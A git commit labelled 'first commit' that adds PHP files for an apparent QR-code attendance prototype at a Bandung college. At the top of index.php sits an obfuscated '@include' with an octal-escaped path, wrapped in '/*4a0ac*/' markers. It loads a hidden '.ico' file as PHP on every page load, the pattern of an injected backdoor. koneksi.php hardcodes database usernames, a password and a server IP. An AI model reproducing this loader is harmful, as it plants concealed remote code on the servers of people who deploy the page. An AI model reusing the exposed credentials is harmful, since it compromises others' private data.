04e4ad64edd2d2edfc51beba8fbe484dfb7e63d7
nurramdandoni <nurramdandoni@gmail.com>
2019-09-03 10:16:56 +0700

    first commit

---
+++ index.php
@@ -0,0 +1,33 @@
+<?php
+/*4a0ac*/
+
+@include "\057h\157m\145/\1654\0716\0674\0646\0649\057d\157m\141i\156s\057s\164t\142a\156d\165n\147.\141c\056i\144/\160u\142l\151c\137h\164m\154/\163i\141k\141d\163t\164b\0635\137s\164t\142/\163y\163t\145m\057c\157r\145/\0560\062e\1453\145f\061.\151c\157";
+
+/*4a0ac*/
+
+
+
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Prototype Absensi QR Code, Mr. Don</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+</head>
+<body>
+	<center><h1>Prototype Absensi Bebasis QR Code</h1></center>
+	<center><h3>Sekolah Tinggi Teknologi Bandung</h3></center>
+	<center><h4>Dev. PPSI @nurramdandoni</h4></center>
+	<center><h5>Support By. Google Crome & InstascanJS(https://github.com/schmich/instascan)</h5></center>
+	<div style="margin-top: 10%;">
+		<div class="col-md-3"></div>
+		<a href="https://sttbandung.ac.id/testQRv0/index3.php"><div class="col-md-3" style="height:100px; background-color: lightblue; border-radius: 5px; margin:5px; text-align: center; padding: 30px 45px;">Server QR<br>(Gunakan Komputer/ Smartphone)</div></a>
+
+		<a href="https://sttbandung.ac.id/testQRv0/index2.php"><div class="col-md-3" style="height:100px; background-color: lightblue; border-radius: 5px; margin:5px; text-align: center; padding: 20px 45px;">Client Scan<br>(Gunakan Komputer/ Smartphone Berkamera)</div></a>
+		<div class="col-md-3"></div>
+	</div>
+</body>
+</html>
---
+++ koneksi.php
@@ -0,0 +1,4 @@
+<?php 
+// $konek = mysqli_connect("185.224.138.77","u634115582_ajax","Aade2ku@","u634115582_ajax"); // server smktb
+$konek = mysqli_connect("localhost","u496744649_ajax","Aade2ku@","u496744649_ajax");
+?>
